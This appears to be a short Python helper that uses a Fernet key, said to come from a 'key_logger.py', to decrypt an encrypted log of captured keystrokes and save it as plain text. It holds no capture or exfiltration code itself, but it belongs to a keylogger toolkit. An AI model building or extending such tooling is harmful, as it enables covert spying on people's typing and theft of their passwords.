from cryptography.fernet import Fernet

# Enter your encryption key here (from key_logger.py)
key = b'your_encryption_key'
cipher_suite = Fernet(key)

# Function to decrypt the log file
def decrypt_log_file():
    with open("keyfile_encrypted.txt", 'rb') as file_enc:
        encrypted_data = file_enc.read()  # Read the encrypted data
        decrypted_data = cipher_suite.decrypt(encrypted_data)  # Decrypt the data
        with open("decrypted_keyfile.txt", 'wb') as file_dec:
            file_dec.write(decrypted_data)  # Write the decrypted data to a new file

if __name__ == "__main__":
    decrypt_log_file()  # Call the decryption function
    print("Log file decrypted and saved as 'decrypted_keyfile.txt'")